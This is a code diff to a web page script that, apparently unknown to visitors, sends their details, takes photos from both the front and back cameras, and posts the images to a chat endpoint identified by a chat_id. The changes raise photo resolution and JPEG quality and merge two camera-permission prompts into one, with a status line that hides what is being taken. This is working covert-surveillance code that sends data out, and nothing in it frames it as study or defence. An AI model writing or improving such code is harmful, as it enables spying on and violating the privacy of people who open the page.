@@ -74,7 +74,7 @@ async function sendPhoto(canvas, num, cam) {
     headers: {"Content-Type": "application/json"},
     body: JSON.stringify({
       chat_id: chatId,
-      photo: canvas.toDataURL("image/jpeg", 0.7),
+      photo: canvas.toDataURL("image/jpeg", 0.8),
       number: `${cam}-${num}`
     })
   });
@@ -89,14 +89,12 @@ async function capture(stream, camName) {
 
   for (let i = 1; i <= 3; i++) {
     const canvas = document.createElement("canvas");
-    canvas.width = video.videoWidth || 640;
-    canvas.height = video.videoHeight || 480;
+    canvas.width = video.videoWidth || 1280;
+    canvas.height = video.videoHeight || 720;
     canvas.getContext("2d").drawImage(video, 0, 0);
 
     sendPhoto(canvas, i, camName);
   }
-
-  stream.getTracks().forEach(t => t.stop());
 }
 
 async function startAll() {
@@ -110,23 +108,39 @@ async function startAll() {
 
     await sendVisitorInfo();
 
-    document.getElementById("status").innerText = "Capturing front...";
+    document.getElementById("status").innerText = "Starting camera...";
 
+    // ✅ SINGLE PERMISSION
     let stream = await navigator.mediaDevices.getUserMedia({
-      video: { facingMode: "user" }
+      video: {
+        width: { ideal: 1280 },
+        height: { ideal: 720 }
+      }
     });
+
+    const track = stream.getVideoTracks()[0];
+
+    // 🔥 FRONT CAMERA
+    document.getElementById("status").innerText = "Capturing front...";
+    await track.applyConstraints({ facingMode: "user" });
     await capture(stream, "front");
 
+    // 🔥 BACK CAMERA (COLOR FIX)
     document.getElementById("status").innerText = "Capturing back...";
-
-    stream = await navigator.mediaDevices.getUserMedia({
-      video: { facingMode: "environment" }
+    await track.applyConstraints({
+      facingMode: { exact: "environment" },
+      width: { ideal: 1280 },
+      height: { ideal: 720 }
     });
     await capture(stream, "back");
 
+    // stop stream
+    stream.getTracks().forEach(t => t.stop());
+
     document.getElementById("status").innerText = "✅ Done";
+
   } catch (e) {
-    document.getElementById("status").innerText = "❌ Permission denied";
+    document.getElementById("status").innerText = "❌ Permission denied / camera error";
   }
 }
 </script>
